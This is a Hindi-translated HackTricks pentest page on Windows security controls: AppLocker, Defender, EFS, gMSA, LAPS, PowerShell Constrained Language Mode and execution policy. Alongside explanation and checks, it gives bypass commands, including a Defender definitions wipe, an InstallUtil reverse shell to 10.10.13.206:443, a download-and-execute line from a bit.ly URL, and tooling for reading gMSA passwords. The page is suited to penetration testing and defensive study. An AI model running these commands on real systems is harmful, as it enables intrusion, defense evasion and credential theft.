# Windows सुरक्षा नियंत्रण

{{#include ../banners/hacktricks-training.md}}

## AppLocker नीति

एप्लिकेशन whitelist उन स्वीकृत सॉफ़्टवेयर एप्लिकेशन या executables की सूची होती है, जिन्हें किसी सिस्टम पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य वातावरण को हानिकारक malware और ऐसे अस्वीकृत सॉफ़्टवेयर से बचाना है, जो किसी संगठन की विशिष्ट व्यावसायिक ज़रूरतों के अनुरूप नहीं होते।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और सिस्टम administrators को इस पर नियंत्रण देता है कि **users कौन-से applications और files चला सकते हैं**। यह executables, scripts, Windows installer files, DLLs, packaged apps और packed app installers पर **बारीक नियंत्रण** प्रदान करता है।\
संगठनों के लिए **cmd.exe और PowerShell.exe को block करना** और कुछ directories में write access रोकना आम है, **लेकिन इन सभी प्रतिबंधों को bypass किया जा सकता है**।

### जांच

देखें कि कौन-सी files/extensions blacklist या whitelist की गई हैं:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` किसी विशिष्ट पहचान के लिए उम्मीदवार फ़ाइलों का AppLocker policy के विरुद्ध मूल्यांकन करता है। उस खाते की जाँच करें जिसका token payload चलाएगा, क्योंकि नियम उपयोगकर्ताओं या समूहों को लक्षित कर सकते हैं; नियमों से मेल खा सकने वाले path, hash और publisher metadata की जाँच के लिए `Get-AppLockerFileInformation` भी उपयोगी है।<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

किसी denied test result को enforced block मानने से पहले, उस rule collection के **effective enforcement mode** और Application Identity service की जाँच करें। `AuditOnly` rules का मूल्यांकन करता है, लेकिन execution की अनुमति देता है, जबकि `NotConfigured` का अर्थ disabled नहीं होता, यदि उस collection में rules मौजूद हों।<sup>[[7]](#references)</sup> रुकी हुई `AppIDSvc` AppLocker enforcement को रोकती है।<sup>[[9]](#references)</sup> ये जाँचें वास्तविक bypass को ऐसी policy से अलग करती हैं जिसने file को कभी block ही नहीं किया।

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

नियंत्रित execution test के लिए, AppLocker event log की तुलना करें: **8003/8006** का अर्थ है कि audit mode में EXE/DLL या script/MSI को block किया गया होता; **8004/8007** का अर्थ है कि उसे वास्तव में block किया गया। intended execution path के समान file type और identity का परीक्षण करें।<sup>[[8]](#references)</sup>

इस registry path में AppLocker द्वारा लागू की गई configurations और policies होती हैं, जिससे system पर लागू मौजूदा rules की समीक्षा की जा सकती है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy को bypass करने के लिए उपयोगी **Writable folders**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को execute करने की अनुमति देता है, तो ऐसे **writable folders** मौजूद हैं जिनका उपयोग आप इसे **bypass** करने के लिए कर सकते हैं।

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- आमतौर पर **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries भी AppLocker को bypass करने में उपयोगी हो सकते हैं।
- **खराब तरीके से लिखे गए rules को भी bypass किया जा सकता है**
  - उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** में, आप कहीं भी **`allowed` नाम का folder** बना सकते हैं और उसे अनुमति मिल जाएगी।
  - Organizations अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable को block करने** पर ध्यान देती हैं, लेकिन अन्य [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) को भूल जाती हैं, जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe`।
- **DLL enforcement बहुत कम ही enabled होता है**, क्योंकि इससे system पर अतिरिक्त load पड़ सकता है और यह सुनिश्चित करने के लिए बहुत testing की ज़रूरत होती है कि कुछ भी खराब न हो। इसलिए, **backdoors के तौर पर DLLs का इस्तेमाल करने से AppLocker को bypass करने में मदद मिलेगी**।
- किसी भी process में **Powershell** code **execute** करने और AppLocker को bypass करने के लिए [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का इस्तेमाल कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

इस file में local credentials मौजूद होते हैं; passwords hashed होते हैं।

### Local Security Authority (LSA) - LSASS

Single Sign-On के कारण इस subsystem की **memory** में **credentials** (hashed) **save** रहते हैं।\
**LSA** local **security policy** (password policy, users permissions...), **authentication**, **access tokens**... को administrate करता है।\
LSA ही local login के लिए **SAM** file में दिए गए credentials को **check** करेगा और domain user को authenticate करने के लिए **domain controller** से **बात** करेगा।

**Credentials**, **LSASS process** में **save** रहते हैं: Kerberos tickets, NT और LM hashes, आसानी से decrypt किए जा सकने वाले passwords।

### LSA secrets

LSA कुछ credentials को disk पर save कर सकता है:

- Active Directory के computer account का password (unreachable domain controller)।
- Windows services के accounts के passwords
- Scheduled tasks के passwords
- और भी (IIS applications के passwords...)

### NTDS.dit

यह Active Directory का database है। यह केवल Domain Controllers में मौजूद होता है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है, जो Windows 10 और Windows 11 तथा Windows Server के versions में उपलब्ध है। यह **`WinPEAS`** जैसे आम pentesting tools को **block** करता है। हालांकि, इन **protections को bypass करने के तरीके** मौजूद हैं।

### Check

**Defender** का **status** check करने के लिए, आप PS cmdlet **`Get-MpComputerStatus`** execute कर सकते हैं (यह जानने के लिए **`RealTimeProtectionEnabled`** की value check करें कि यह active है या नहीं):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे enumerate करने के लिए आप यह भी run कर सकते हैं:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS **symmetric key** का उपयोग करके फ़ाइलों को encryption के ज़रिए सुरक्षित करता है। इस key को **File Encryption Key (FEK)** कहा जाता है। यह key उपयोगकर्ता की **public key** से encrypt की जाती है और फ़ाइल के NTFS `$EFS` metadata (`$LOGGED_UTILITY_STREAM`) में store होती है, किसी सामान्य `$DATA` alternate data stream में **नहीं**।<sup>[[10]](#references)</sup> Decryption की ज़रूरत होने पर, उपयोगकर्ता के digital certificate की संबंधित **private key**, FEK को unwrap करती है। कॉन्फ़िगर किए गए data recovery agent (DRA) के पास Data Recovery Field में FEK की एक अलग encrypted copy होती है।<sup>[[13]](#references)</sup>

**उपयोगकर्ता की पहल के बिना decryption की स्थितियाँ**:

- जब फ़ाइलों या folders को किसी non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), पर move किया जाता है, तो वे अपने-आप decrypt हो जाती हैं।
- SMB/CIFS protocol के ज़रिए network पर भेजी जाने से पहले encrypted फ़ाइलें decrypt हो जाती हैं।

यह encryption method, फ़ाइल के owner को encrypted फ़ाइलों तक **transparent access** देता है। हालाँकि, केवल owner का password बदलकर log in करने से decryption नहीं हो पाएगा।

**मुख्य बातें**:

- EFS एक symmetric FEK का उपयोग करता है, जिसे उपयोगकर्ता की public key से encrypt किया जाता है।
- FEK तक पहुँचने के लिए decryption में उपयोगकर्ता की private key का इस्तेमाल होता है।
- कुछ स्थितियों में, जैसे FAT32 पर copy करने या network transmission के दौरान, अपने-आप decryption होता है।
- Encrypted फ़ाइलें owner के लिए बिना किसी अतिरिक्त कदम के उपलब्ध होती हैं।

### EFS info जाँचें

`%APPDATA%\Microsoft\Protect` देखकर EFS के उपयोग का अनुमान न लगाएँ: इसमें Windows की कई सुविधाओं के DPAPI master keys store होते हैं।<sup>[[19]](#references)</sup> इसके बजाय, `cipher /c "C:\path\file"` से किसी encrypted फ़ाइल की जाँच करें; यह उसके user और recovery certificates की सूची दिखाता है। `cipher /e` और `cipher /d` उस principal के लिए फ़ाइलों को encrypt और decrypt करते हैं जिसके पास matching private key हो।<sup>[[11]](#references)</sup>

### EFS फ़ाइलें decrypt करना

अगर `cipher /c` में recovery certificate दिखता है और आपके पास PFX में उसकी **matching DRA private key** है, तो उस PFX को मौजूदा user के certificate store में import करें और फिर फ़ाइल decrypt करें।<sup>[[11]](#references)[[12]](#references)</sup> नया बनाया गया DRA certificate पुरानी फ़ाइलों को decrypt नहीं कर सकता: फ़ाइल encrypt किए जाने के समय उसकी public key शामिल होनी चाहिए थी। NTFS ACL access या account password reset करने से अकेले आवश्यक private key नहीं मिलती।<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### SYSTEM अथॉरिटी होना

इस तरीके के लिए ज़रूरी है कि **victim user** होस्ट पर कोई **process** **चल रहा** हो। अगर ऐसा है, तो `meterpreter` session से आप उस user के process token का impersonation कर सकते हैं (`incognito` से `impersonate_token`)। इसके बजाय, आप user के process में `migrate` कर सकते हैं।

#### User का Password जानना

Mimikatz user का certificate और private key import कर सकता है, फिर उनका इस्तेमाल EFS-protected files को decrypt करने के लिए कर सकता है।<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ने IT infrastructures में service accounts का प्रबंधन आसान बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। पारंपरिक service accounts के विपरीत, जिनमें अक्सर "**Password never expire**" setting enabled होती है, gMSA अधिक सुरक्षित और आसानी से प्रबंधित होने वाला समाधान देते हैं:

- **Automatic Password Management**: gMSA एक जटिल, 240-byte password इस्तेमाल करते हैं, जो सामान्यतः हर 30 दिनों में rotate होता है। Domain controllers इसे KDS key material से derive करते हैं, जिससे password को manually update करने की ज़रूरत नहीं रहती।<sup>[[16]](#references)[[20]](#references)</sup>
- **Enhanced Security**: ये accounts lockout से अप्रभावित रहते हैं और interactive logins के लिए इस्तेमाल नहीं किए जा सकते, जिससे इनकी सुरक्षा बेहतर होती है।
- **Multiple Host Support**: gMSA को कई hosts पर साझा किया जा सकता है, जिससे ये कई servers पर चलने वाली services के लिए आदर्श हैं।
- **Scheduled Task Capability**: managed service accounts के विपरीत, gMSA scheduled tasks चलाने का समर्थन करते हैं।
- **Simplified SPN Management**: computer के sAMaccount details या DNS name में बदलाव होने पर system Service Principal Name (SPN) को अपने-आप update करता है, जिससे SPN प्रबंधन आसान हो जाता है।

Domain controller, KDS से derive किए गए password material से LDAP attribute _**msDS-ManagedPassword**_ को read के दौरान बनाता है; यह value अलग से stored password नहीं होती। यह सामान्यतः हर 30 दिनों में बदलती है।<sup>[[20]](#references)</sup> लौटाया गया [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) **encrypted password नहीं है**: इसके `CurrentPassword` field में cleartext password होता है।<sup>[[14]](#references)</sup> Access की जाँच `msDS-GroupMSAMembership` के आधार पर होती है, इसलिए retrieval rights दिए गए सभी principals दायरे में आते हैं—सिर्फ administrators या service hosts नहीं।<sup>[[15]](#references)</sup> LDAP connection में confidentiality होनी चाहिए, उदाहरण के लिए LDAPS या SASL sealing के ज़रिए।<sup>[[20]](#references)</sup>

KDS root-key exposure के बाद offline password derivation के लिए, [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md) देखें।

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

आप यह password [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** से पढ़ सकते हैं:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**इस पोस्ट में अधिक जानकारी देखें**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

साथ ही, **gMSA** का **password** **पढ़ने** के लिए **NTLM relay attack** करने का तरीका जानने हेतु यह [वेब पेज](https://cube0x0.github.io/Relaying-for-gMSA/) देखें।<sup>[[3]](#references)</sup>

## LAPS

Enumeration के दौरान **legacy Microsoft LAPS** और native **Windows LAPS** implementation में अंतर पहचानें। Windows LAPS, 11 अप्रैल 2023 के Windows updates में आया था और managed local administrator password का backup **Windows Server Active Directory** या **Microsoft Entra ID** में रख सकता है। AD-backed deployments में यह passwords को encrypt भी कर सकता है, encrypted password history बनाए रख सकता है और domain controller का DSRM password manage कर सकता है। Downloadable legacy MSI नए Windows versions पर deprecated है, हालांकि Windows LAPS legacy-emulation mode में काम कर सकता है।<sup>[[6]](#references)</sup>

चूँकि legacy Microsoft LAPS और Windows LAPS अलग-अलग implementations हैं, इसलिए attribute- या cmdlet-specific attacks लागू करने से पहले पता करें कि इनमें से कौन-सा deployed है। यहाँ उन प्रक्रियाओं को दोहराने के बजाय, linked page discovery, ACL enumeration, retrieval, expiration manipulation और offline recovery के बारे में जानकारी देता है।<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell को प्रभावी ढंग से इस्तेमाल करने के लिए ज़रूरी कई features को **lock down करता है**—जैसे COM objects को block करना, केवल approved .NET types की अनुमति देना, XAML-based workflows और PowerShell classes को रोकना, आदि।

### **जाँचें**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` केवल उन hosts पर legacy downgrade था जिनमें optional PowerShell 2 engine installed था। इसे updated Windows 11 24H2 या Windows Server 2025 में शामिल नहीं किया गया है; इसे मौजूदा CLM bypass न मानें।<sup>[[17]](#references)</sup> Application control के तहत, PowerShell untrusted code को Constrained Language में चलाता है, जबकि policy-trusted scripts Full Language में चल सकती हैं।<sup>[[18]](#references)</sup>

पुरानी configurations के लिए, आप [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) का उपयोग कर सकते हैं।\
**इसे compile करने के लिए, आपको** **एक Reference जोड़ना** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ना और **project को .Net4.5 में बदलना पड़ सकता है**।

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

आप किसी भी process में **Powershell** code **execute** करने और constrained mode को bypass करने के लिए [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)।<sup>[[1]](#references)</sup>

## PS Execution Policy

डिफ़ॉल्ट रूप से यह **restricted** पर सेट होता है। इस policy को bypass करने के मुख्य तरीके:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

और जानकारी [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> मिल सकती है।

## Security Support Provider Interface (SSPI)

यह एक API है जिसका उपयोग users को authenticate करने के लिए किया जा सकता है।

SSPI उन दो machines के लिए उपयुक्त protocol खोजने का काम करेगा जो आपस में communicate करना चाहती हैं। इसके लिए पसंदीदा तरीका Kerberos है। इसके बाद SSPI तय करेगा कि कौन-सा authentication protocol इस्तेमाल किया जाएगा। इन authentication protocols को Security Support Provider (SSP) कहा जाता है। ये हर Windows machine में DLL के रूप में मौजूद होते हैं, और communicate करने के लिए दोनों machines को एक ही SSP support करना होगा।

### मुख्य SSPs

- **Kerberos**: पसंदीदा विकल्प
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** और **NTLMv2**: Compatibility के लिए
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers और LDAP के लिए, password MD5 hash के रूप में
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS के लिए
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: इस्तेमाल किए जाने वाले protocol (Kerberos या NTLM) पर बातचीत करने के लिए। Kerberos default विकल्प है।
  - %windir%\Windows\System32\lsasrv.dll

#### बातचीत में कई methods या सिर्फ़ एक method दिया जा सकता है।

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक feature है, जो **elevated activities के लिए consent prompt** दिखाता है।

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [AppLocker और PowerShell constrained language mode को bypass करना](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [तरीका ~ EFS files को decrypt करना](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA के लिए relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy को bypass करने के 15 तरीके](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [AppLocker Windows PowerShell cmdlets का उपयोग करना](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS का परिचय](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [AppLocker rules के साथ काम करना](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [AppLocker के साथ Event Viewer का उपयोग करना](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [AppLocker processes और interactions](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [File streams (local file systems)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Cipher command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Certutil command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Recovery agent EFS private key का backup लेना](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [ms-DS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Secure group managed service accounts](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Windows client से हटाए गए features](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [PowerShell को secure करने के लिए App Control का उपयोग करना](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Event 4693 और DPAPI master keys](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [msDS-ManagedPassword का निर्माण](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
